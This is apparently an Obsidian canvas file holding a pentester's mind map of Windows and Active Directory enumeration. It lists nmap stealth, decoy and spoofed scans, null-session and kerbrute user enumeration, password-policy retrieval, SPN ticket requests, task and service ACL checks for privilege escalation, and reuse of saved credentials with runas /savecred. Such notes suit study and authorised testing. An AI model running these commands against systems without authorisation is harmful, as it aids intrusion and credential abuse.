{
	"nodes":[
		{"id":"d00c5485e9541cc4","type":"group","x":-1480,"y":1234,"width":987,"height":3560,"label":"List of LDAP Search Query Attributes"},
		{"id":"3618ee225dba3fbb","type":"group","x":-2305,"y":2160,"width":750,"height":2760,"label":"Nmap Options"},
		{"id":"02faa126b087790a","type":"group","x":-4160,"y":350,"width":1220,"height":1410,"label":"Search topic"},
		{"id":"b766e572bc489ec9","type":"group","x":1600,"y":1680,"width":1136,"height":720,"label":"Untitled group"},
		{"id":"1a4e7aa95674bf2f","type":"group","x":-2320,"y":1234,"width":780,"height":840,"label":"UAS Value List"},
		{"id":"be46450db2cae69a","type":"text","text":"# MindMap of Windows Enumeration","x":-1493,"y":810,"width":392,"height":104,"color":"1"},
		{"id":"179094e6ba2d2b2c","type":"text","text":"## Check system on domain or workgroup\n\n``` powershell\n\n(Get-WmiObject Win32_ComputerSystem).PartOfDomain\n(Get-WmiObject Win32_ComputerSystem).Domain\n\n```\n\n``` CMD\nwmic computersystem get domain,partofdomain\n```","x":-934,"y":720,"width":522,"height":285},
		{"id":"f4fccffd7cae9f32","type":"text","text":"1. **Organizational Attributes**:\n    \n    - `o`: Organization name\n    - `ou`: Organizational unit name\n    - `dc`: Domain component\n    - `l`: Locality (e.g., city)\n    - `st`: State or province name\n    - `c`: Country name\n    - `postalCode`: Postal code\n2. **Personal Attributes**:\n    \n    - `cn`: Common name\n    - `sn`: Surname (last name)\n    - `givenName`: First name\n    - `initials`: Initials of the person\n    - `displayName`: Display name\n    - `description`: Description of the entry\n    - `uid`: User ID\n    - `userPassword`: User's password\n    - `mail`: Email address\n    - `telephoneNumber`: Telephone number\n    - `homePhone`: Home phone number\n    - `mobile`: Mobile phone number\n    - `facsimileTelephoneNumber`: Fax number\n    - `pager`: Pager number\n    - `homePostalAddress`: Home postal address\n    - `postalAddress`: Postal address\n3. **Organizational Role Attributes**:\n    \n    - `title`: Job title\n    - `ou`: Organizational unit\n    - `employeeNumber`: Employee number\n    - `employeeType`: Type of employee (e.g., contractor, full-time)\n4. **Security and Access Control Attributes**:\n    \n    - `objectClass`: Class of the object (e.g., person, organizationalPerson, inetOrgPerson)\n    - `userCertificate`: User certificate\n    - `userSMIMECertificate`: S/MIME certificate\n    - `userPKCS12`: PKCS #12 user certificate\n5. **Group Attributes**:\n    \n    - `member`: List of members\n    - `uniqueMember`: Unique members (used in group entries)\n6. **Location Attributes**:\n    \n    - `physicalDeliveryOfficeName`: Office location\n    - `roomNumber`: Room number\n7. **Miscellaneous Attributes**:\n    \n    - `preferredLanguage`: Preferred language\n    - `manager`: Manager's DN (Distinguished Name)\n    - `seeAlso`: DN of related entries\n\n### Active Directory Specific Attributes\n\n1. **Account and Login Attributes**:\n    \n    - `sAMAccountName`: Security Account Manager (SAM) account name\n    - `userPrincipalName`: User Principal Name (UPN)\n    - `msDS-UserAccountControlComputed`: Computed user account control\n    - `accountExpires`: Account expiration date\n2. **Group and Membership Attributes**:\n    \n    - `memberOf`: Groups the user is a member of\n    - `primaryGroupID`: Primary group ID\n3. **Profile and Settings Attributes**:\n    \n    - `profilePath`: Path to the user's profile\n    - `homeDirectory`: Path to the user's home directory\n    - `scriptPath`: Path to the user's logon script\n4. **Logon Information Attributes**:\n    \n    - `lastLogon`: Last logon timestamp\n    - `lastLogoff`: Last logoff timestamp\n    - `pwdLastSet`: Timestamp when the password was last set\n5. **Exchange Attributes (for use with Microsoft Exchange)**:\n    \n    - `msExchHomeServerName`: Exchange home server name\n    - `msExchMailboxGUID`: Mailbox GUID\n\n#### Core Schema Attributes\n1. **Posix Account Attributes** (used in UNIX/Linux systems):\n    \n    - `uidNumber`: User ID number\n    - `gidNumber`: Group ID number\n    - `homeDirectory`: Home directory path\n    - `loginShell`: Login shell\n    - `gecos`: GECOS field (used for general information about the user)\n2. **LDAP Authentication Attributes**:\n    \n    - `authPassword`: Authentication password\n    - `shadowLastChange`: Last password change date\n    - `shadowMin`: Minimum number of days between password changes\n    - `shadowMax`: Maximum number of days before a password change is required\n    - `shadowWarning`: Number of days before password expiration warning\n    - `shadowInactive`: Number of days after password expiration until the account is disabled\n\n#### Extended Active Directory (AD) Attributes\n\n1. **Account Control Attributes**:\n    \n    - `userAccountControl`: Account control settings (e.g., disabled, password not required)\n    - `lockoutTime`: Account lockout timestamp\n    - `badPwdCount`: Number of bad password attempts\n2. **Additional Profile and Group Attributes**:\n    \n    - `logonCount`: Number of successful logons\n    - `memberOf`: Groups that the user is a direct member of\n    - `primaryGroupToken`: Primary group token\n3. **Exchange Server Attributes**:\n    \n    - `msExchMailNickname`: Mail nickname\n    - `msExchUserCulture`: User culture settings for Exchange\n    - `homeMDB`: Home mailbox database\n\n#### Organization-Specific and Miscellaneous Attributes\n\n1. **Service and Application Attributes**:\n    \n    - `servicePrincipalName`: Service principal names (for Kerberos authentication)\n    - `userWorkstations`: User workstations (allowed logon workstations)\n2. **Extended Contact Information**:\n    \n    - `pager`: Pager number\n    - `company`: Company name\n    - `department`: Department name\n    - `streetAddress`: Street address\n    - `postOfficeBox`: Post office box\n    - `internationalISDNNumber`: International ISDN number\n3. **Custom and Extended Schema Attributes**:\n    \n    - `jpegPhoto`: JPEG photograph of the person\n    - `carLicense`: Car license\n    - `audio`: Audio file\n    - `businessCategory`: Business category\n    - `preferredDeliveryMethod`: Preferred delivery method\n4. **Application-Specific Attributes**:\n    \n    - `radiusProfileDn`: Radius profile distinguished name (used in network access authentication)\n    - `radiusCallbackNumber`: Radius callback number\n5. **Security and Certification Attributes**:\n    \n    - `userCertificate`: User X.509 certificate\n    - `authorityRevocationList`: Authority revocation list\n    - `certificateRevocationList`: Certificate revocation list\n    - `supportedAlgorithms`: Supported algorithms for security operations","x":-1400,"y":1289,"width":840,"height":3434},
		{"id":"51f02f35b94e42e2","type":"text","text":"| Property flag                  | Value in hexadecimal | Value in decimal |\n| ------------------------------ | -------------------- | ---------------- |\n| SCRIPT                         | 0x0001               | 1                |\n| ACCOUNTDISABLE                 | 0x0002               | 2                |\n| HOMEDIR_REQUIRED               | 0x0008               | 8                |\n| LOCKOUT                        | 0x0010               | 16               |\n| PASSWD_NOTREQD                 | 0x0020               | 32               |\n| PASSWD_CANT_CHANGE             | 0x0040               | 64               |\n| ENCRYPTED_TEXT_PWD_ALLOWED     | 0x0080               | 128              |\n| TEMP_DUPLICATE_ACCOUNT         | 0x0100               | 256              |\n| NORMAL_ACCOUNT                 | 0x0200               | 512              |\n| INTERDOMAIN_TRUST_ACCOUNT      | 0x0800               | 2048             |\n| WORKSTATION_TRUST_ACCOUNT      | 0x1000               | 4096             |\n| SERVER_TRUST_ACCOUNT           | 0x2000               | 8192             |\n| DONT_EXPIRE_PASSWORD           | 0x10000              | 65536            |\n| MNS_LOGON_ACCOUNT              | 0x20000              | 131072           |\n| SMARTCARD_REQUIRED             | 0x40000              | 262144           |\n| TRUSTED_FOR_DELEGATION         | 0x80000              | 524288           |\n| NOT_DELEGATED                  | 0x100000             | 1048576          |\n| USE_DES_KEY_ONLY               | 0x200000             | 2097152          |\n| DONT_REQ_PREAUTH               | 0x400000             | 4194304          |\n| PASSWORD_EXPIRED               | 0x800000             | 8388608          |\n| TRUSTED_TO_AUTH_FOR_DELEGATION | 0x1000000            | 16777216         |\n| PARTIAL_SECRETS_ACCOUNT        | 0x04000000           | 67108864         |","x":-2280,"y":1289,"width":680,"height":754},
		{"id":"d2f501ac23e65154","type":"text","text":"# Host Discovery\n\n|Scan Type|Example Command|\n|---|---|\n|ARP Scan|sudo nmap -PR -sn MACHINE_IP/24|\n|ICMP Echo Scan|sudo nmap -PE -sn MACHINE_IP/24|\n|ICMP Timestamp Scan|sudo nmap -PP -sn MACHINE_IP/24|\n|ICMP Address Mask Scan|sudo nmap -PM -sn MACHINE_IP/24|\n|TCP SYN Ping Scan|sudo nmap -PS22,80,443 -sn MACHINE_IP/30|\n|TCP ACK Ping Scan|sudo nmap -PA22,80,443 -sn MACHINE_IP/30|\n|UDP Ping Scan|sudo nmap -PU53,161,162 -sn MACHINE_IP/30|\n\n---\n\n# Basic Port scan\n\n|Port Scan Type|Example Command|\n|---|---|\n|TCP Connect Scan|nmap -sT 10.10.24.210|\n|TCP SYN Scan|sudo nmap -sS 10.10.24.210|\n|UDP Scan|sudo nmap -sU 10.10.24.210|\n\n|Option|Purpose|\n|---|---|\n|-p-|all ports|\n|-p1-1023|scan ports 1 to 1023|\n|-F|100 most common ports|\n|-r|scan ports in consecutive order|\n|-T<0-5>|-T0 being the slowest and T5 the fastest|\n|--max-rate 50|rate <= 50 packets/sec|\n|--min-rate 15|rate >= 15 packets/sec|\n|--min-parallelism 100|at least 100 probes in parallel|\n\n---\n\n# Advanced Port scan\n\n|Port Scan Type|Example Command|\n|---|---|\n|TCP Null Scan|sudo nmap -sN 10.10.128.183|\n|TCP FIN Scan|sudo nmap -sF 10.10.128.183|\n|TCP Xmas Scan|sudo nmap -sX 10.10.128.183|\n|TCP Maimon Scan|sudo nmap -sM 10.10.128.183|\n|TCP ACK Scan|sudo nmap -sA 10.10.128.183|\n|TCP Window Scan|sudo nmap -sW 10.10.128.183|\n|Custom TCP Scan|sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.10.128.183|\n|Spoofed Source IP|sudo nmap -S SPOOFED_IP 10.10.128.183|\n|Spoofed MAC Address|--spoof-mac SPOOFED_MAC|\n|Decoy Scan|nmap -D DECOY_IP,ME 10.10.128.183|\n|Idle (Zombie) Scan|sudo nmap -sI ZOMBIE_IP 10.10.128.183|\n|Fragment IP data into 8 bytes|-f|\n|Fragment IP data into 16 bytes|-ff|\n\n|Option|Purpose|\n|---|---|\n|--source-port PORT_NUM|specify source port number|\n|--data-length NUM|append random data to reach given length|\n\n|Option|Purpose|\n|---|---|\n|--reason|explains how Nmap made its conclusion|\n|-v|verbose|\n|-vv|very verbose|\n|-d|debugging|\n|-dd|more details for debugging|\n\n---\n\n# Post Port scan\n\n| Option | Meaning |\n| --- | --- |\n| -sV | determine service/version info on open ports |\n| -sV --version-light | try the most likely probes (2) |\n| -sV --version-all | try all available probes (9) |\n| -O | detect OS |\n| --traceroute | run traceroute to target |\n| --script=SCRIPTS | Nmap scripts to run |\n| -sC or --script=default | run default scripts |\n| -A | equivalent to -sV -O -sC --traceroute |\n| -oN | save output in normal format |\n| -oG | save output in grepable format |\n| -oX | save output in XML format |\n| -oA | save output in normal, XML and Grepable formats |\n\n","x":-2265,"y":2184,"width":680,"height":2691},
		{"id":"fd20440e9c030e43","type":"text","text":"## Enumeration from outside Network","x":-3444,"y":-603,"width":315,"height":94,"color":"1"},
		{"id":"9bd198a34318a26e","type":"text","text":"``` bash\nnmap -sVS -sC -Pn -n <IP> -oN <FileName>\n```\n* Ckeck nmap optins.","x":-2718,"y":-1015,"width":436,"height":113},
		{"id":"ef231c4d15f7be41","type":"text","text":"## PowerView\n### helpful link\nhttps://gowthamaraj-rajendran.medium.com/red-teaming-ad-enumeration-domain-objects-trust-2144e7c28939","x":-4120,"y":595,"width":480,"height":175},
		{"id":"554086cace7b573f","type":"text","text":"``` powershell\nCommandType     Name            \n-----------     ----         \nAlias           Get-NetComputer\nAlias           Get-NetDomain\nAlias           Get-NetDomainController\nAlias           Get-NetDomainTrust\nAlias           Get-NetFileServer\nAlias           Get-NetForest\nAlias           Get-NetForestCatalog\nAlias           Get-NetForestDomain\nAlias           Get-NetForestTrust\nAlias           Get-NetGPO\nAlias           Get-NetGPOGroup\nAlias           Get-NetGroup\nAlias           Get-NetGroupMember\nAlias           Get-NetOU\nAlias           Get-NetProcess\nAlias           Get-NetSite\nAlias           Get-NetSubnet\nAlias           Get-NetUser\n```","x":-4120,"y":791,"width":428,"height":500},
		{"id":"3e7c8dde12984413","type":"text","text":"``` powershell\nGet-ADDefaultDomainPasswordPolicy\nGet-ADAccountLockoutPolicy\nGet-ADDefaultDomainPasswordPolicy | Select-Object -Property Kerberos*\n```","x":-3640,"y":870,"width":660,"height":171},
		{"id":"a709ce4fba947613","type":"text","text":"### LDAP\n``` powershell\nGet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\" -Name \"LDAPServerIntegrity\"\ndsacls \"CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=yourdomai\n```","x":-3640,"y":1070,"width":660,"height":221},
		{"id":"a0476fae22727811","type":"text","text":"``` bash\nfping -asgq <IP>/<Mask>\n```\n* Fping provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host.","x":-2718,"y":-795,"width":800,"height":155},
		{"id":"e7db0e78be1cb482","type":"text","text":"## Enum4linux\n```bash\n enum4linux -U <IP>  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"\n```\n### RpcClient\n``` bash\nrpcclient -U \"\" -N <IP>\n## enumdomusers : Enumerate domain user names\n```\n## CrackMapExec\n``` bash\ncrackmapexec smb <IP> --users\n```\n## Ldapsearch\n```shell\nldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&(objectclass=user))\"  | grep sAMAccountName: | cut -f2 -d\" \"\n```\n### Kerbrute\n```shell\nkerbrute userenum -d inlanefreight.local --dc <IP> /opt/jsmith.txt \n```","x":-1898,"y":-1295,"width":913,"height":739},
		{"id":"13f32d1f193f5038","type":"text","text":"## Enumerate Password Policies ","x":-2716,"y":-355,"width":522,"height":80},
		{"id":"6b35698f8767bcd0","type":"text","text":"## Making a Target User List","x":-2718,"y":-509,"width":522,"height":80},
		{"id":"30b436478509e521","type":"text","text":"### CrackMapExec\n``` bash\n## Enumerating & Retrieving Password Policies\ncrackmapexec smb <IP> -u <UserName> -p <RandomPassword> --pass-pol\n```\n### RpcClient\n``` bash\n## check a Domain Controller for SMB NULL session access.\nrpcclient -U \"\" -N <IP>\n## querydominfo / getdompwinfo : for check Password policies\n```\n## ldapsearch\n``` bash\n## Ldapsearch give lost of information about domain so grep only important part\nldapsearch -h <IP> -x -b \"<Domain Distinguished Name>\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength\n```\n## Enum4Linux\n``` bash\nenum4linux -P <IP>\n\n## Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the `-oA` flag.\nenum4linux-ng -P <IP> -oA <FileName>\n```","x":-1898,"y":-509,"width":840,"height":734},
		{"id":"8b2a08f708d981d0","type":"text","text":"### Domain DNS, local DNS cash ...\n`dig`","x":-3480,"y":630,"width":480,"height":104},
		{"id":"5e48ae0e0f1ab924","type":"text","text":"## Enumeration Tools \n","x":-3600,"y":450,"width":313,"height":69,"color":"#cca000"},
		{"id":"29e3222117a8cea0","type":"text","text":"## Network Enumeration","x":-4120,"y":390,"width":480,"height":69},
		{"id":"b6ca74efaa020150","type":"text","text":"## Plain Text Enumeration","x":-4120,"y":485,"width":480,"height":72},
		{"id":"2de2ee2abb20ef8c","type":"text","text":"``` Powershell\n## Retrieves replication partner metadata for a specific domain controller.\nGet-ADReplicationPartnerMetadata -Target \"<DomainController>\"\n\n## Retrieves replication failures for a specific domain.\nGet-ADReplicationFailure -Scope \"<Domain>\"\n\n## Retrieves replication up-to-dateness vector table for a specific domain controller.\nGet-ADReplicationUpToDatenessVectorTable -Server \"<DomainController>\"\n\n## Retrieves fine-grained password policies in the domain.\nGet-ADFineGrainedPasswordPolicy\n```","x":-6240,"y":360,"width":834,"height":333},
		{"id":"10a8688b038b625c","type":"text","text":"DSQUETY \n```\n6. **dsquery subnet -limit 0**: Lists all subnets in the domain.\n7. **dsquery site -limit 0**: Lists all sites in the domain.\n8. **dsquery contact -limit 0**: Lists all contacts in the domain.\n9. 1. **dsquery server -domain <domain>**: Lists servers in a domain.\n```","x":-5220,"y":350,"width":786,"height":309},
		{"id":"9ac754a60f9e613f","type":"text","text":"## Users and Groups","x":3400,"y":-640,"width":265,"height":75,"color":"6"},
		{"id":"57a21e56f2b5da47","type":"text","text":"## UserAccountControl Searching","x":3457,"y":-1183,"width":416,"height":81,"color":"6"},
		{"id":"46c1560599835fe5","type":"text","text":"``` Powershell\n## Retrieves members of the domain group along with their names and SAM account names.\nGet-ADGroupMember \"< GroupName >\" | Select-Object Name, SamAccountName\n```\n\n``` CMD\n##  Displays group information on a domain.\nnet group\n\n## Lists members of the Domain Admins group.\nnet group \"< GroupName >\" /domain\n```\n##### Important Group names for search : \n* Domain Admins, Enterprise Admins\n* Domain Controllers\n* Schema Admins, Exchange\n* Organization Administrators\n* Administrators\n\n","x":3976,"y":-870,"width":820,"height":535,"color":"6"},
		{"id":"2c9957cc781b9ceb","type":"text","text":"## Sample\n``` powershell\n((userAccountControl:1.2.840.113556.1.4.803:=32))\n```\n#### OID match strings\n\nOIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules: `1.2.840.113556.1.4.803`\nhttps://ldap.com/ldap-oid-reference-guide/\n\n#### UAC Values\nRepresents the decimal bitmask we want to match in search.\nCheck UAS Value list.\n","x":3976,"y":-1341,"width":1465,"height":394,"color":"6"},
		{"id":"7d70237c675cebc5","type":"text","text":"# 1.AD RECON\n# 2.Ping Castle\n\n# 3.SharpHound","x":-3240,"y":373,"width":260,"height":222,"color":"3"},
		{"id":"607d19eb4c086c1c","type":"text","text":"## GPO","x":-3480,"y":770,"width":480,"height":60},
		{"id":"2af816f32de2763b","type":"text","text":"## Domain Enumeration","x":-8220,"y":234,"width":289,"height":100},
		{"id":"27d3f31dc58e04ae","type":"text","text":"\n``` Powershell\nGet-Domain                    ## Return AD object for the current (or specified) domain.\n\nGet-DomainController          ## Return a list of the target domain controllers for the specified target domain.\n\nGet-DomainUser                ## Return all users or specific user objects in AD.\n\nGet-DomainComputer            ## Return all computers or specific computer objects in AD.\n\nGet-DomainGroup               ## Return all groups or specific group objects in AD.\n\nGet-DomainOU                  ## Search for all or specific OU objects in AD.\n\nGet-DomainGroupMember         ## Return the members of a specific domain group.\n\nGet-DomainFileServer          ## Return a list of servers likely functioning as file servers.\n\nGet-DomainDFSShare            ## Return a list of all distributed file systems for the current (or specified) domain.\n\nGet-DomainGPO                 ## Return all GPOs or specific GPO objects in AD.\n\nGet-DomainPolicy              ## Return the default domain policy or the domain controller policy for the current domain.\n \nGet-DomainTrust               ## Returns domain trusts for the current domain or a specified domain.\n\nGet-ForestTrust               ## Returns all forest trusts for the current forest or a specified forest.\n\nGet-DomainForeignUser         ## Enumerates users who are in groups outside of the user's domain.\n\nGet-DomainForeignGroupMember  ## Enumerates groups with users outside of the group's domain and returns each foreign member.\n\nGet-DomainTrustMapping        ## Enumerates all trusts for current domain and any others seen.\n\nGet-DomainGroupMember -Identity \"<GroupName>\" -Recurse  ## ist all the members of a target group.\n\nGet-DomainSPNTicket           ## Request the kerberos ticket for a specified service principal name.\n```\n","x":-7560,"y":-126,"width":1160,"height":820},
		{"id":"6dccd093c14f4c8c","type":"text","text":"## PowerView","x":-8640,"y":252,"width":340,"height":64},
		{"id":"71521985f7f09781","type":"text","text":"``` bash\ncrackmapexec smb <IP> -u '' -p '' --users --export $(pwd)/users.txt \n\nCheck for SMB NULL sessions on a domain controller host and enumerate valid users\n```","x":3261,"y":-2393,"width":809,"height":139},
		{"id":"71d7fa52d78485de","type":"text","text":"``` Powershell\n## Retrieves the properties of the Active Directory domain.\nGet-ADDomain\n\n## Retrieves the properties of the Active Directory forest.\nGet-ADForest\n\n## Retrieves the properties of domain controllers.\nGet-ADDomainController \n\n## Retrieves domain controllers along with their names, sites, and IPv4 addresses.\nGet-ADDomainController -Filter * | Select-Object Name, Site, IPv4Address\n```\n\n","x":1567,"y":-341,"width":1013,"height":320,"color":"6"},
		{"id":"95ca6015ba1034aa","type":"text","text":"``` powershell\n## Displays domain trust relationships.\nnltest /domain_trusts \n## Lists domain controllers for a specified domain.\nnltest /dclist:< domain > \n\n## Powershell version\nGet-ADTrust -Filter *\n```","x":1600,"y":120,"width":700,"height":214,"color":"6"},
		{"id":"e05e9a5b1a82d0d1","type":"text","text":"#### Check ACL of running task : \n##### Task To Run:                          C:\\\\path\\\\to\\\\task\n```CMD\nicacls C:\\path\\to\\task\n```\n\n``` Powershell\nget-acl c:\\tasks\\schtask.bat | fl\n```","x":4160,"y":98,"width":630,"height":258},
		{"id":"2c065c4f9b53fb4d","type":"text","text":"```CMD\nschtasks /query /tn <TaskName> /fo list /v\n```\n\n```Powershell\n$r = @(\"TaskName\",\"State\",\"Execute\");foreach ($t in Get-ScheduledTask){$a=\"\" | Select TaskName, State, Execute; $a.Taskname = $t.TaskName;$a.Execute = $t.Actions.Execute;$a.State=$t.State;$r += $a}$r | Where-Object TaskName -eq \"vulntask\"\n```\n","x":3120,"y":525,"width":784,"height":241},
		{"id":"71c0359516cb7711","type":"text","text":"#### Check running task path for unquoted tasks:\n```\nTask To Run:                  C:\\Path\\my task\\task.exe\n```\n#### Check ACL for sub folder :\n``` CMD\nicacls C:\\Path\n```\n\n``` Powershell\nget-acl c:\\Path | fl\n```","x":4182,"y":470,"width":586,"height":352},
		{"id":"dfb727dcc6ed7eae","type":"text","text":"## Check suspicious named tasks","x":2640,"y":607,"width":264,"height":77},
		{"id":"c226757e89689a23","type":"text","text":"##### Checks Access Control List (ACL) permissions of executable file of the service\n```CMD\nicacls C:\\Windows\\System32\\svchost.exe\n```\n\n```powershell\nget-acl C:\\Windows\\System32\\svchost.exe | fl\n```","x":3768,"y":1186,"width":796,"height":231},
		{"id":"a0b951863e97e01b","type":"text","text":"```CMD\n# Lists all scheduled tasks with detailed information\nschtasks /query /fo LIST /v\n\n# Lists detailed information about a specific task named \"TaskName\".\nschtasks /query /fo LIST /v /tn <TaskName>\n\n```\n\n```powershell\n# Retrieves all scheduled tasks and formats the output in a detailed list format.\nGet-ScheduledTask | Format-List *\n\n# Lists scheduled tasks along with their triggers\nGet-ScheduledTask | Select-Object TaskName, Triggers\n\n```","x":1580,"y":454,"width":831,"height":382},
		{"id":"c814b6cece9faa34","type":"text","text":"```CMD\n# Lists all services, including running and stopped\nsc query state= all\n\n# Queries the status of a specific service \nsc query wuauserv\n\n# Displays the configuration of a specific service\nsc qc wuauserv\n```\n\n```powershell\n# Lists all services on the system\nGet-Service | Format-List *\n\n# Provides detailed information about a specific service\nGet-Service -Name < ServiceName > | Format-List *\n\n# Lists services along with their statuses\nGet-Service | Select-Object Name, Status\n\n# Filters and lists only the running services\nGet-Service | Where-Object { $_.Status -eq 'Running' }\n\n# Retrieves detailed configuration and status of a specific service using WMI\nGet-WmiObject -Class Win32_Service -Filter \"Name='wuauserv'\" | Format-List *\n```","x":1580,"y":991,"width":1280,"height":620},
		{"id":"91239944f8a7edd5","type":"text","text":"## Check permissions and ACL ","x":3120,"y":1265,"width":388,"height":73},
		{"id":"d01ff3ae477bd6d8","type":"text","text":"``` Powershell\n## Retrieves all user accounts along with their names, SAM account names, and descriptions.\nGet-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, Description\n\n## Retrieves all groups along with their names, categories, and descriptions.\nGet-ADGroup -Filter * -Properties * | Select-Object Name, GroupCategory, Description\n\n## Retrieves all computers along with their names, operating systems, and service packs.\nGet-ADComputer -Filter * -Properties * | Select-Object Name, OperatingSystem, OperatingSystemServicePack\n\n## Retrieves all organizational units along with their names and descriptions.\nGet-ADOrganizationalUnit -Filter * -Properties * | Select-Object Name, Description\n```","x":2140,"y":-947,"width":960,"height":320,"color":"6"},
		{"id":"374c876881c8bb7c","type":"text","text":"## Ldap Enumeration","x":1996,"y":-1216,"width":289,"height":74,"color":"6"},
		{"id":"ea7f2a13f546dc8d","type":"text","text":"``` CMD\n## Lists all components of each type object.\ndsquery < user | computer | group | ou > -name * -limit 0\n\n## Lists all objects in the domain with their distinguished names.\ndsquery * -filter (objectClass=*) -attr distinguishedName\n```","x":2140,"y":-577,"width":960,"height":189,"color":"6"},
		{"id":"703c7defdf6773d9","type":"text","text":"``` Powershell\n## Searching with LDAP searh filters\nGet-ADObject -LDAPFilter \"(attribute=value)\" \ndsquery * -filter \"(attribute=value)\"\n```\nCheck list of Attributes.\n##### Basic LDAP Search Filters\n- **Equality Filter**: `(attribute=valu)`\n- **Presence Filter**: `(attribute=*)`\n- **Negation Filter**: `(!(attribute=value))`\n- **AND Filter**: `(&(filter1)(filter2)...)`\n- **OR Filter**: `(|(filter1)(filter2)...)`\n##### Complex Filters\n\n1. **AND with OR Filter**: `(&(filter1)(|(filter2)(filter3)...))`\n2. **OR with AND Filter**: `(|(filter1)(&(filter2)(filter3)...))`","x":2400,"y":-1534,"width":857,"height":554,"color":"6"},
		{"id":"28513652a61ed161","type":"text","text":"``` powershell\nImport-Module ActiveDirectory\n\nWrite-Host \"Kerberos Enumeration:\"\n$kerberosInfo = Get-ADUser -Filter * -Properties UserPrincipalName, ServicePrincipalName\nforeach ($user in $kerberosInfo) {\n    if ($user.ServicePrincipalName) {\n        Write-Host \"  $($user.Name)\"\n        foreach ($spn in $user.ServicePrincipalName) {\n            Write-Host \"    $spn\"\n        }\n    }\n}\n\nWrite-Host \"NTLM Enumeration:\"\n$ntlmInfo = Get-ADUser -Filter * -Properties UserPrincipalName\nforeach ($user in $ntlmInfo) {\n    Write-Host \"  $($user.Name) - $($user.UserPrincipalName)\"\n}\n\nWrite-Host \"SMB Enumeration:\"\n$shares = Get-WmiObject -Class Win32_Share\nforeach ($share in $shares) {\n    Write-Host \"  $($share.Name) - $($share.Path)\"\n}\n\nWrite-Host \"Domain Controllers Enumeration:\"\n$domainControllers = Get-ADDomainController -Filter *\nforeach ($dc in $domainControllers) {\n    Write-Host \"  $($dc.HostName)\"\n}\n\nWrite-Host \"Domain Users Enumeration:\"\n$domainUsers = Get-ADUser -Filter *\nforeach ($user in $domainUsers) {\n    Write-Host \"  $($user.SamAccountName) - $($user.Name)\"\n}\n\nWrite-Host \"Domain Groups Enumeration:\"\n$domainGroups = Get-ADGroup -Filter *\nforeach ($group in $domainGroups) {\n    Write-Host \"  $($group.Name)\"\n}\n\nWrite-Host \"Domain Computers Enumeration:\"\n$domainComputers = Get-ADComputer -Filter *\nforeach ($computer in $domainComputers) {\n    Write-Host \"  $($computer.Name)\"\n}\n```","x":1482,"y":-2393,"width":847,"height":1074,"color":"2"},
		{"id":"91e94e49805a18e0","type":"text","text":"## Get-AD commands","x":1480,"y":-784,"width":289,"height":74,"color":"6"},
		{"id":"069f95b3afe3e7f8","type":"text","text":"``` powershell\n## Identify accounts where Kerberos pre-authentication is disabled, as these may be susceptible to brute-force attacks.\nGet-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $true}\n\n## Enumerate accounts with Kerberos constrained delegation rights\nGet-ADUser -Filter * -Properties msDS-AllowedToDelegateTo | Where-Object {$_.msDS-AllowedToDelegateTo -ne $null}\n\n## Analyze Kerberos ticket lifetimes to ensure they align with security policies and detect anomalies.\nGet-ADUser -Identity <Username> -Properties KerberosTicketFlags | Select-Object KerberosTicketFlags\n```","x":902,"y":-2731,"width":1222,"height":258},
		{"id":"ff732b12b148d58e","type":"text","text":"## DSQUERY","x":1480,"y":-640,"width":289,"height":74,"color":"6"},
		{"id":"4665eb8b32ad4ede","type":"text","text":"## CrackMapExec","x":2841,"y":-2374,"width":336,"height":102},
		{"id":"f4ac75b58e011232","type":"text","text":"``` powershell\n## Monitor event logs for Kerberos TGS requests, which can provide insights into service principal names (SPNs) and authentication activities.\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4769}\n```\n","x":902,"y":-2897,"width":1224,"height":131},
		{"id":"f54bfd7504bdda81","type":"text","text":"**Look for:** If there are any save credentials\n``` powershell\n# List saved credentials\ncmdkey /list  \n```","x":3640,"y":2785,"width":664,"height":150,"color":"#0599f5"},
		{"id":"c5feb11c6cdba705","type":"text","text":"* If there are any credentials, you could run command prompt as that user\n\n```\nrunas /savecred /user:username cmd.exe\n```\n\n","x":3640,"y":2993,"width":664,"height":120,"color":"#0599f5"},
		{"id":"27058d0c157af620","type":"text","text":"## System Uptime","x":2268,"y":3270,"width":336,"height":60,"color":"5"},
		{"id":"3ba9ae3e76777285","type":"text","text":"## Am I Alone?","x":2268,"y":3590,"width":336,"height":60,"color":"5"},
		{"id":"040354d243694771","type":"text","text":"## IIS Configuration","x":2356,"y":3369,"width":336,"height":61,"color":"#0599f5"},
		{"id":"2e78f8741799e6c4","type":"text","text":"PuTTY","x":2356,"y":3483,"width":250,"height":60,"color":"#0599f5"},
		{"id":"a76559cfff78391f","type":"text","text":"## Defender Enumeration","x":1636,"y":3560,"width":357,"height":60,"color":"5"},
		{"id":"608fdb9ce399c55d","type":"text","text":"## Hardware Enumeration","x":1636,"y":3367,"width":357,"height":66,"color":"5"},
		{"id":"70cb92a429e23f5a","type":"text","text":"``` powershell\n## setspn used in Windows environments to manage Service Principal Names (SPNs)\nsetspn [options] < service account >\n\n## SPN to the specified account.\nsetspn -A < SPN > < account >\n\n## Deletes an SPN from the specified account.\nsetspn -D < SPN > < account >\n\n## Lists all SPNs registered to the specified account.\nsetspn -L < account >\n```","x":900,"y":-3260,"width":760,"height":320},
		{"id":"35c0d89f91ba38a3","type":"text","text":"``` powershell\n## to list all cached Kerberos tickets on a Windows\nKlist\n```","x":902,"y":-3407,"width":520,"height":115},
